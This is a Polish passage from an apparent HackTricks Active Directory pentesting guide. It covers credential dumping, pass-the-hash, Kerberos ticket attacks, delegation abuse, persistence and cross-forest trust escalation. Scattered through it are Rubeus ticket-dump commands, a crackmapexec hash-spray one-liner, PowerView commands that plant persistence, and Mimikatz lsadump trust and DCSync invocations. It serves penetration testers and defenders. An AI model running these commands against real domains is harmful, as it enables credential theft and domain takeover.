Następnie oceń odzyskane dane uwierzytelniające gMSA tak jak każde inne: sprawdź członkostwo w grupach lokalnych i domenowych, prawa logowania, SPN-y, delegowanie oraz dostępne usługi, zanim spróbujesz pass-the-hash. Ta ścieżka pozyskiwania oparta na ACL różni się od [Golden gMSA/dMSA](golden-dmsa-gmsa.md), która pozwala wyprowadzić zarządzane hasła po przejęciu klucza głównego KDS.<sup>[[20]](#references)</sup>

Komputerowy podmiot zabezpieczeń może też mieć kontrolę wychodzącą nad innymi obiektami komputerów lub grupami. Po jego pozyskaniu osobno sprawdź jego zagnieżdżone członkostwo i efektywne ACL: prawo zapisu do innego obiektu komputera może umożliwić zmianę konta, a prawa związane z członkostwem w grupie mogą prowadzić do uzyskania roli umożliwiającej logowanie. Flaga konta etapowego, przewidywalna konwencja nazewnictwa ani sama relacja `GenericWrite` nie dowodzą istnienia pełnej ścieżki.

Czytelna kopia bloba `msDS-ManagedPassword` w pliku, udziale lub kopii zapasowej stanowi odrębną ścieżkę narażenia: ACL odczytu LDAP nie chroni kopii zapisanej w innym miejscu. Przed interpretacją sprawdź, czy dane są blobem zarządzanego hasła, i odróżnij tę sytuację zarówno od autoryzowanego odczytu LDAP, jak i wyprowadzania hasła na podstawie klucza głównego KDS.

### Kerberoast

Kerberoasting polega na pozyskiwaniu **biletów TGS** używanych przez usługi powiązane z kontami użytkowników i łamaniu ich szyfrowania — opartego na hasłach użytkowników — **offline**.

Więcej informacji na ten temat:

{{#ref}}
kerberoast.md
{{#endref}}

### Połączenie zdalne (RDP, SSH, FTP, Win-RM itd.)

Po uzyskaniu danych uwierzytelniających możesz sprawdzić, czy masz dostęp do jakiejś **maszyny**. Możesz w tym celu użyć **CrackMapExec**, aby spróbować połączyć się z kilkoma serwerami za pomocą różnych protokołów, odpowiednio do wyników skanowania portów.

### Eskalacja uprawnień lokalnie

Jeśli przejąłeś dane uwierzytelniające lub sesję zwykłego użytkownika domeny i możesz uzyskać dostęp do **dowolnej maszyny w domenie**, poszukaj sposobu na **lokalną eskalację uprawnień i pozyskanie danych uwierzytelniających**. Uprawnienia administratora lokalnego mogą pozwolić na **zrzucenie hashy innych użytkowników** z pamięci (LSASS) i pamięci lokalnej (SAM).

W tej książce znajduje się osobna strona poświęcona [**lokalnej eskalacji uprawnień w Windows**](../windows-local-privilege-escalation/index.html) oraz [**lista kontrolna**](../checklist-windows-privilege-escalation.md). Pamiętaj też, aby użyć [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Bilety bieżącej sesji

Jest **mało prawdopodobne**, że wśród **biletów** bieżącego użytkownika znajdziesz takie, które **pozwolą Ci uzyskać dostęp** do nieoczekiwanych zasobów, ale możesz to sprawdzić:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Mając poświadczenia domenowe lub sesję użytkownika, ponownie przyjrzyj się [**atakom relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): techniki enumeracji uwierzytelnionej i wymuszania uwierzytelnienia mogą ujawnić ścieżki relay, które były niedostępne podczas rozpoznania bez uwierzytelnienia.

### Wyszukiwanie poświadczeń w udziałach komputerów | Udziały SMB

Mając już podstawowe poświadczenia, sprawdź, czy możesz **znaleźć** jakieś **interesujące pliki udostępniane w ramach AD**. Możesz zrobić to ręcznie, ale jest to bardzo monotonne i powtarzalne zadanie (zwłaszcza jeśli znajdziesz setki dokumentów do sprawdzenia).

[**Kliknij ten link, aby poznać narzędzia, których możesz użyć.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Kradzież poświadczeń NTLM

Jeśli możesz **uzyskać dostęp do innych komputerów lub udziałów**, możesz **umieścić pliki** (na przykład plik SCF), które po otwarciu **wywołają uwierzytelnienie NTLM względem Ciebie**, dzięki czemu możesz **ukraść** **wyzwanie NTLM** i je złamać:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ta podatność umożliwiała każdemu uwierzytelnionemu użytkownikowi **przejęcie kontrolera domeny**.


{{#ref}}
printnightmare.md
{{#endref}}

## Eskalacja uprawnień w Active Directory Z uprzywilejowanymi poświadczeniami/sesją

**Do przeprowadzenia poniższych ataków nie wystarczy zwykły użytkownik domeny — potrzebujesz specjalnych uprawnień lub poświadczeń.**

### Pozyskiwanie hashy

Miejmy nadzieję, że udało Ci się **przejąć jakieś konto lokalnego administratora** przy użyciu [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), w tym ataków relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) lub [lokalnej eskalacji uprawnień](../windows-local-privilege-escalation/index.html).\
Następnie pora zrzucić wszystkie hashe z pamięci i systemu lokalnego.\
[**Przeczytaj tę stronę, aby poznać różne sposoby pozyskiwania hashy.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Gdy masz już hash użytkownika**, możesz użyć go, aby **podszyć się pod niego**.\
Potrzebujesz **narzędzia**, które **przeprowadzi uwierzytelnianie NTLM przy użyciu** tego **hasha**, **albo** możesz utworzyć nową **sesję logowania** i **wstrzyknąć** ten **hash** do **LSASS**, aby był używany podczas każdego **uwierzytelniania NTLM**. Właśnie to robi mimikatz.\
[**Przeczytaj tę stronę, aby uzyskać więcej informacji.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Celem tego ataku jest **użycie hasha NTLM użytkownika do żądania biletów Kerberos** jako alternatywy dla typowego Pass The Hash za pośrednictwem protokołu NTLM. Może to być szczególnie **przydatne w sieciach, w których protokół NTLM jest wyłączony**, a do uwierzytelniania **dozwolony jest wyłącznie Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

W metodzie ataku **Pass The Ticket (PTT)** atakujący **kradną bilet uwierzytelniający użytkownika** zamiast jego hasła lub wartości hash. Następnie używają skradzionego biletu, aby **podszyć się pod użytkownika** i uzyskać nieautoryzowany dostęp do zasobów i usług w sieci.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Ponowne użycie poświadczeń

Jeśli masz **hash** lub **hasło** **lokalnego administratora**, spróbuj **zalogować się lokalnie** na innych **komputerach** przy jego użyciu.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Należy pamiętać, że jest to dość **głośne** i **LAPS** może temu **zapobiec**.

### Nadużywanie MSSQL i zaufane łącza

Jeśli użytkownik ma uprawnienia do **uzyskiwania dostępu do instancji MSSQL**, może być w stanie **wykonywać polecenia** na hoście MSSQL (jeśli działa jako SA), **wykraść** **hash** NetNTLM, a nawet przeprowadzić **atak** typu **relay**.\
Jeśli instancja MSSQL jest zaufana przez inną instancję za pośrednictwem łącza do bazy danych, użytkownik mający uprawnienia do połączonej bazy może być w stanie **wykorzystać relację zaufania do wykonywania zapytań na innej instancji**. Takie relacje zaufania można łączyć, co może ostatecznie doprowadzić do źle skonfigurowanej bazy danych, w której użytkownik może wykonywać polecenia.\
**Łącza między bazami danych działają również między zaufanymi lasami.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Nadużywanie platform do zarządzania zasobami IT i wdrażania

Pakiety do inwentaryzacji i wdrażania rozwiązań innych firm często zapewniają zaawansowane możliwości uzyskiwania poświadczeń i wykonywania kodu. Zobacz:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Delegowanie bez ograniczeń

Jeśli znajdziesz dowolny obiekt Computer z atrybutem [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i masz uprawnienia domenowe na tym komputerze, będziesz mieć możliwość zrzucenia z pamięci TGT wszystkich użytkowników logujących się na tym komputerze.\
Jeśli więc **Domain Admin zaloguje się na tym komputerze**, będziesz mieć możliwość zrzucenia jego TGT i podszycia się pod niego za pomocą [Pass the Ticket](pass-the-ticket.md).\
Dzięki delegowaniu ograniczonemu możesz nawet **automatycznie przejąć Print Server** (miejmy nadzieję, że będzie to DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Delegowanie ograniczone

Jeśli użytkownik lub komputer ma włączone „Constrained Delegation”, będzie mógł **podszywać się pod dowolnego użytkownika, aby uzyskać dostęp do wybranych usług na komputerze**.\
Jeśli następnie **przejmiesz hash** tego użytkownika/komputera, będziesz mieć możliwość **podszywania się pod dowolnego użytkownika** (nawet administratorów domeny), aby uzyskać dostęp do wybranych usług.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Delegowanie ograniczone oparte na zasobach

Posiadanie uprawnienia **WRITE** do obiektu Active Directory zdalnego komputera umożliwia uzyskanie możliwości wykonywania kodu z **podwyższonymi uprawnieniami**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Nadużywanie uprawnień/ACL

Przejęty użytkownik może mieć **interesujące uprawnienia do niektórych obiektów domeny**, które mogą pozwolić na późniejsze **przemieszczanie się** w sieci bocznej/**eskalację** uprawnień.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Nadużywanie usługi Printer Spooler

Wykrycie usługi **Spool nasłuchującej** w domenie może zostać **wykorzystane** do **pozyskania nowych poświadczeń** i **eskalacji uprawnień**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Nadużywanie sesji użytkowników zewnętrznych

Jeśli **inni użytkownicy** **uzyskują dostęp** do **przejętego** komputera, możliwe jest **pozyskanie poświadczeń z pamięci**, a nawet **wstrzyknięcie beaconów do ich procesów**, aby się pod nich podszyć.\
Zazwyczaj użytkownicy uzyskują dostęp do systemu za pośrednictwem RDP, dlatego poniżej opisano, jak przeprowadzić kilka ataków na sesje RDP innych użytkowników:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** zapewnia system zarządzania **hasłem lokalnego Administratora** na komputerach dołączonych do domeny, gwarantując, że jest ono **losowe**, unikatowe i często **zmieniane**. Hasła te są przechowywane w Active Directory, a dostęp do nich jest kontrolowany za pomocą ACL i przyznawany wyłącznie upoważnionym użytkownikom. Wystarczające uprawnienia do uzyskania dostępu do tych haseł umożliwiają przeskok na inne komputery.


{{#ref}}
laps.md
{{#endref}}

### Kradzież certyfikatów

Informacje o rejestracji w AD CS, mapowaniu certyfikatów i enumeracji przed podjęciem prób kradzieży certyfikatów lub nadużycia szablonów znajdziesz w [omówieniu certyfikatów AD](ad-certificates.md).

**Pozyskanie certyfikatów** z przejętego komputera może być sposobem na eskalację uprawnień w środowisku:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Nadużywanie szablonów certyfikatów

Jeśli skonfigurowano **podatne szablony**, można je wykorzystać do eskalacji uprawnień:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation z kontem o wysokich uprawnieniach

### Zrzucanie poświadczeń domeny

Po uzyskaniu uprawnień **Domain Admin** lub, jeszcze lepiej, **Enterprise Admin**, możesz **zrzucić** **bazę danych domeny**: _ntds.dit_.

[**Więcej informacji o ataku DCSync znajdziesz tutaj**](dcsync.md).

[**Więcej informacji o kradzieży pliku NTDS.dit znajdziesz tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Czytelne archiwum kopii zapasowej zawierające `ntds.dit` wraz z gałęzią rejestru `SYSTEM` należy traktować jako ujawnione dane katalogowe jeszcze przed jego rozpakowaniem. Nieaktualny hash hasła nie oznacza, że inne atrybuty obiektów są bezpieczne: pola takie jak `description` mogą zawierać poświadczenia lub notatki operacyjne. Najpierw sprawdź nazwy elementów archiwum i nie umieszczaj rozpakowanej zawartości bazy danych w rutynowych wynikach enumeracji.

### Privesc jako mechanizm utrzymania dostępu

Niektóre z omówionych wcześniej technik można wykorzystać do utrzymania dostępu.\
Możesz na przykład:

- Uczynić użytkowników podatnymi na [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Spraw, aby użytkownicy byli podatni na [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Przyznaj użytkownikowi uprawnienia [**DCSync**](#dcsync)

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack** tworzy **legitimate Ticket Granting Service (TGS) ticket** dla określonej usługi, używając **NTLM hash** (na przykład **hasha konta komputera**). Ta metoda służy do **uzyskiwania dostępu do uprawnień usługi**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** polega na uzyskaniu przez atakującego dostępu do **NTLM hash konta krbtgt** w środowisku Active Directory (AD). To konto jest wyjątkowe, ponieważ służy do podpisywania wszystkich **Ticket Granting Tickets (TGTs)**, niezbędnych do uwierzytelniania w sieci AD.

Po uzyskaniu tego hasha atakujący może tworzyć **TGTs** dla dowolnego wybranego konta (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Są podobne do Golden Ticket, ale sfałszowane w sposób **pozwalający ominąć typowe mechanizmy wykrywania Golden Ticket.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence konta z użyciem certyfikatów**

**Posiadanie certyfikatów konta lub możliwość ich zamówienia** to bardzo dobry sposób na utrzymanie persistence na koncie użytkownika (nawet jeśli zmieni on hasło):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence w domenie z użyciem certyfikatów**

**Certyfikaty można również wykorzystać do utrzymania persistence z wysokimi uprawnieniami w domenie:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupa AdminSDHolder

Obiekt **AdminSDHolder** w Active Directory zabezpiecza **grupy uprzywilejowane** (takie jak Domain Admins i Enterprise Admins), stosując standardową **Access Control List (ACL)** do tych grup, aby zapobiegać nieautoryzowanym zmianom. Funkcję tę można jednak wykorzystać w ataku: jeśli atakujący zmodyfikuje ACL obiektu AdminSDHolder, aby przyznać pełny dostęp zwykłemu użytkownikowi, użytkownik ten zyska szeroką kontrolę nad wszystkimi grupami uprzywilejowanymi. Środek bezpieczeństwa, który miał chronić, może więc przynieść odwrotny skutek i umożliwić nieuprawniony dostęp, jeśli nie będzie dokładnie monitorowany.

[**Więcej informacji o grupie AdminDSHolder znajdziesz tutaj.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Dane uwierzytelniające DSRM

Na każdym **Domain Controller (DC)** istnieje konto **lokalnego administratora**. Po uzyskaniu praw administratora na takim komputerze można wyodrębnić hash lokalnego konta Administrator za pomocą **mimikatz**. Następnie należy zmodyfikować rejestr, aby **włączyć używanie tego hasła** i umożliwić zdalny dostęp do lokalnego konta Administratora.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistence przez ACL

Możesz **przyznać** **użytkownikowi** pewne **specjalne uprawnienia** do określonych obiektów domeny, które pozwolą mu **eskalować uprawnienia w przyszłości**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Deskryptory zabezpieczeń

**Deskryptory zabezpieczeń** służą do **przechowywania** **uprawnień**, jakie **obiekt** ma **do** innego **obiektu**. Wystarczy **niewielka zmiana** w **deskryptorze zabezpieczeń** obiektu, aby uzyskać bardzo interesujące uprawnienia do tego obiektu bez konieczności należenia do uprzywilejowanej grupy.


{{#ref}}
security-descriptors.md
{{#endref}}

### Obiekty dynamiczne — anti-forensics / unikanie wykrycia

Wykorzystaj pomocniczą klasę `dynamicObject`, aby tworzyć krótkotrwałe podmioty zabezpieczeń/GPO/rekordy DNS z atrybutami `entryTTL`/`msDS-Entry-Time-To-Die`; usuwają się automatycznie bez tombstones, zacierając ślady w LDAP, ale pozostawiając osierocone SID-y, nieprawidłowe odwołania `gPLink` lub buforowane odpowiedzi DNS (np. zanieczyszczenie ACE w AdminSDHolder albo złośliwe przekierowania `gPCFileSysPath`/DNS zintegrowanego z AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Zmodyfikuj **LSASS** w pamięci, aby ustanowić **uniwersalne hasło** zapewniające dostęp do wszystkich kont w domenie.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Dowiedz się tutaj, czym jest SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Możesz utworzyć **własny SSP**, aby **przechwytywać** w **postaci jawnego tekstu** **dane uwierzytelniające** używane do uzyskania dostępu do komputera.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Rejestruje **nowy Domain Controller** w AD i używa go do **wypchnięcia atrybutów** (SIDHistory, SPNs...) do określonych obiektów, **nie pozostawiając** żadnych **logów** dotyczących **modyfikacji**. Wymagane są uprawnienia **DA** oraz dostęp do **root domain**.\
Pamiętaj, że użycie nieprawidłowych danych spowoduje pojawienie się dość nieprzyjemnych logów.


{{#ref}}
dcshadow.md
{{#endref}}

### Persistence przez LAPS

Wcześniej omówiliśmy, jak eskalować uprawnienia, jeśli masz **wystarczające uprawnienia do odczytu haseł LAPS**. Tych haseł można jednak również użyć do **utrzymania persistence**.\
Sprawdź:


{{#ref}}
laps.md
{{#endref}}

## Eskalacja uprawnień w lesie — zaufania między domenami

Microsoft uznaje **las** za granicę bezpieczeństwa. Oznacza to, że **przejęcie jednej domeny może potencjalnie doprowadzić do przejęcia całego lasu**.<sup>[[1]](#references)</sup>

### Podstawowe informacje

[**Zaufanie między domenami**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) to mechanizm bezpieczeństwa umożliwiający użytkownikowi z jednej **domeny** dostęp do zasobów w innej **domenie**. Tworzy powiązanie między systemami uwierzytelniania obu domen, pozwalające na płynne przekazywanie weryfikacji uwierzytelniania. Gdy domeny ustanawiają zaufanie, wymieniają i przechowują określone **klucze** na swoich **Domain Controllers (DCs)**, które mają kluczowe znaczenie dla integralności zaufania.

W typowym scenariuszu, jeśli użytkownik chce uzyskać dostęp do usługi w **zaufanej domenie**, musi najpierw zażądać specjalnego biletu, znanego jako **inter-realm TGT**, od kontrolera domeny swojej domeny. Ten TGT jest szyfrowany współdzielonym **kluczem**, na który zgodziły się obie domeny. Następnie użytkownik przedstawia ten TGT **kontrolerowi domeny zaufanej domeny**, aby uzyskać bilet usługi (**TGS**). Po pomyślnej weryfikacji inter-realm TGT przez kontroler domeny zaufanej domeny wystawia on TGS, przyznając użytkownikowi dostęp do usługi.

**Kroki**:

1. **Komputer kliencki** w **Domenie 1** rozpoczyna proces, używając swojego **NTLM hash**, aby zażądać **Ticket Granting Ticket (TGT)** od swojego **Domain Controller (DC1)**.
2. DC1 wystawia nowy TGT, jeśli klient zostanie pomyślnie uwierzytelniony.
3. Następnie klient żąda od DC1 **inter-realm TGT**, potrzebnego do uzyskania dostępu do zasobów w **Domenie 2**.
4. Inter-realm TGT jest szyfrowany **kluczem zaufania** współdzielonym przez DC1 i DC2 w ramach dwukierunkowego zaufania między domenami.
5. Klient przekazuje inter-realm TGT do **Domain Controller Domeny 2 (DC2)**.
6. DC2 weryfikuje inter-realm TGT przy użyciu współdzielonego klucza zaufania i, jeśli jest prawidłowy, wystawia **Ticket Granting Service (TGS)** dla serwera w Domenie 2, do którego klient chce uzyskać dostęp.
7. Na koniec klient przedstawia ten TGS serwerowi. TGS jest szyfrowany hashem konta serwera i umożliwia uzyskanie dostępu do usługi w Domenie 2.

### Różne typy zaufania

Warto zauważyć, że **zaufanie może być jednokierunkowe lub dwukierunkowe**. W przypadku zaufania dwukierunkowego domeny ufają sobie nawzajem, natomiast w przypadku zaufania **jednokierunkowego** jedna z domen jest **domeną zaufaną**, a druga **domeną ufającą**. W tym drugim przypadku **można uzyskać dostęp do zasobów w domenie ufającej wyłącznie z domeny zaufanej**.

Jeśli Domena A ufa Domenie B, A jest domeną ufającą, a B domeną zaufaną. Ponadto w **Domenie A** jest to **zaufanie wychodzące**, a w **Domenie B** — **zaufanie przychodzące**.

**Różne relacje zaufania**

- **Zaufania nadrzędny-podrzędny**: To typowa konfiguracja w obrębie tego samego lasu, w której domena podrzędna automatycznie ma dwukierunkowe zaufanie przechodnie z domeną nadrzędną. Oznacza to, że żądania uwierzytelniania mogą być płynnie przekazywane między domeną nadrzędną a podrzędną.
- **Zaufania krzyżowe**: Nazywane „zaufaniami skrótowymi”, są ustanawiane między domenami podrzędnymi w celu przyspieszenia procesu przekazywania żądań. W złożonych lasach żądania uwierzytelniania są zwykle przekazywane w górę do korzenia lasu, a następnie w dół do domeny docelowej. Utworzenie zaufania krzyżowego skraca tę drogę, co jest szczególnie przydatne w środowiskach rozproszonych geograficznie.
- **Zaufania zewnętrzne**: Są ustanawiane między różnymi, niepowiązanymi domenami i z natury są nieprzechodnie. Zgodnie z [dokumentacją Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) zaufania zewnętrzne przydają się do uzyskiwania dostępu do zasobów w domenie poza bieżącym lasem, która nie jest połączona zaufaniem między lasami. Bezpieczeństwo jest wzmacniane przez filtrowanie SID w przypadku zaufania zewnętrznego.
- **Zaufania korzeni drzew domen**: Są automatycznie ustanawiane między domeną główną lasu a nowo dodanym korzeniem drzewa domen. Choć nie spotyka się ich często, są ważne przy dodawaniu do lasu nowych drzew domen, ponieważ pozwalają im zachować unikatową nazwę domeny i zapewniają dwukierunkową przechodniość. Więcej informacji można znaleźć w [przewodniku Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Zaufania między lasami**: Ten typ zaufania jest dwukierunkowym, przechodnim zaufaniem między domenami głównymi dwóch lasów. Wymusza również filtrowanie SID w celu zwiększenia bezpieczeństwa.
- **Zaufania MIT**: Są ustanawiane z domenami Kerberos innymi niż Windows, zgodnymi ze standardem [RFC4120](https://tools.ietf.org/html/rfc4120). Zaufania MIT są bardziej specjalistyczne i przeznaczone dla środowisk wymagających integracji z systemami opartymi na Kerberos poza ekosystemem Windows.

#### Inne różnice w **relacjach zaufania**

- Relacja zaufania może być **przechodnia** (A ufa B, B ufa C, więc A ufa C) lub **nieprzechodnia**.
- Relacja zaufania może być **dwukierunkowa** (domeny ufają sobie nawzajem) lub **jednokierunkowa** (jedna domena ufa drugiej).

### Ścieżka ataku

1. **Wylicz** relacje zaufania.
2. Sprawdź, czy jakikolwiek **podmiot zabezpieczeń** (użytkownik/grupa/komputer) ma **dostęp** do zasobów **innej domeny**, na przykład dzięki wpisom ACE lub przynależności do grup w innej domenie. Szukaj **relacji między domenami** (prawdopodobnie właśnie w tym celu ustanowiono zaufanie).
   1. W takim przypadku kerberoast może być kolejną opcją.
3. **Przejmij** **konta**, które umożliwiają **pivotowanie** między domenami.

Atakujący mogą uzyskiwać dostęp do zasobów w innej domenie za pomocą trzech głównych mechanizmów:

- **Członkostwo w grupie lokalnej**: Podmioty zabezpieczeń mogą zostać dodane do lokalnych grup na komputerach, takich jak grupa „Administrators” na serwerze, co daje im znaczną kontrolę nad tym komputerem.
- **Członkostwo w grupie obcej domeny**: Podmioty zabezpieczeń mogą również należeć do grup w obcej domenie. Skuteczność tej metody zależy jednak od rodzaju zaufania i zakresu grupy.
- **Access Control Lists (ACLs)**: Podmioty zabezpieczeń mogą być wskazane w **ACL**, szczególnie jako elementy **ACE** w obrębie **DACL**, co zapewnia im dostęp do określonych zasobów. Osobom, które chcą lepiej poznać działanie ACL, DACL i ACE, przyda się whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)”.<sup>[[17]](#references)</sup>

### Znajdowanie użytkowników/grup zewnętrznych z uprawnieniami

Możesz sprawdzić **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, aby znaleźć obce podmioty zabezpieczeń w domenie. Będą to użytkownicy/grupy z **zewnętrznej domeny/lasu**.

Możesz to sprawdzić w **Bloodhound** lub za pomocą powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Eskalacja uprawnień z domeny podrzędnej do nadrzędnej w lesie

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Inne sposoby enumerowania relacji zaufania między domenami:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Istnieją **2 zaufane klucze**: jeden dla _Child --> Parent_, a drugi dla _Parent_ --> _Child_.\
> Możesz sprawdzić, którego z nich używa bieżąca domena, za pomocą:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Uzyskaj uprawnienia Enterprise admin w domenie podrzędnej/nadrzędnej, nadużywając zaufania za pomocą SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Wykorzystanie zapisywalnego Configuration NC

Zrozumienie, w jaki sposób można wykorzystać Configuration Naming Context (NC), ma kluczowe znaczenie. Configuration NC pełni rolę centralnego repozytorium danych konfiguracyjnych w środowiskach Active Directory (AD), w obrębie całego lasu. Dane te są replikowane do każdego kontrolera domeny (DC) w lesie, a zapisywalne DC przechowują zapisywalną kopię Configuration NC. Aby to wykorzystać, trzeba mieć **uprawnienia SYSTEM na DC**, najlepiej podrzędnym DC.

**Połącz GPO z witryną głównego DC**

Kontener Sites w Configuration NC zawiera informacje o witrynach wszystkich komputerów dołączonych do domeny w lesie AD. Działając z uprawnieniami SYSTEM na dowolnym DC, atakujący mogą połączyć GPO z witrynami głównych DC. Działanie to może doprowadzić do przejęcia domeny głównej poprzez manipulowanie zasadami stosowanymi do tych witryn.

Więcej informacji można znaleźć w opracowaniach na temat [omijania filtrowania SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Przejmij dowolne gMSA w lesie**

Jednym z wektorów ataku jest zaatakowanie uprzywilejowanych gMSA w domenie. Klucz główny KDS, niezbędny do obliczania haseł gMSA, jest przechowywany w Configuration NC. Mając uprawnienia SYSTEM na dowolnym DC, można uzyskać dostęp do klucza głównego KDS i obliczyć hasła dowolnych gMSA w całym lesie.

Szczegółową analizę i instrukcje krok po kroku można znaleźć w:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Uzupełniający atak z delegowanym MSA (BadSuccessor – nadużycie atrybutów migracji):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatkowe zewnętrzne opracowanie: [Ataki Golden gMSA Trust](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Atak polegający na zmianie schematu**

Ta metoda wymaga cierpliwości — trzeba poczekać na utworzenie nowych uprzywilejowanych obiektów AD. Mając uprawnienia SYSTEM, atakujący może zmodyfikować schemat AD, aby przyznać dowolnemu użytkownikowi pełną kontrolę nad wszystkimi klasami. Może to doprowadzić do nieautoryzowanego dostępu do nowo tworzonych obiektów AD i przejęcia nad nimi kontroli.

Więcej informacji można znaleźć w opracowaniu na temat [ataków zaufania z wykorzystaniem zmian schematu](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Od DA do EA za pomocą ADCS ESC5**

Luka ADCS ESC5 polega na przejęciu kontroli nad obiektami Public Key Infrastructure (PKI) w celu utworzenia szablonu certyfikatu, który umożliwia uwierzytelnianie jako dowolny użytkownik w lesie. Ponieważ obiekty PKI znajdują się w Configuration NC, przejęcie zapisywalnego podrzędnego DC umożliwia przeprowadzenie ataków ESC5.

Więcej informacji na ten temat można znaleźć w artykule [Od DA do EA za pomocą ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Jeśli w środowisku nie ma ADCS, atakujący może skonfigurować niezbędne komponenty, jak opisano w artykule [Eskalacja uprawnień z Domain Admins w domenie podrzędnej do Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Domena zewnętrznego lasu — jednokierunkowe (przychodzące) lub dwukierunkowe zaufanie

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
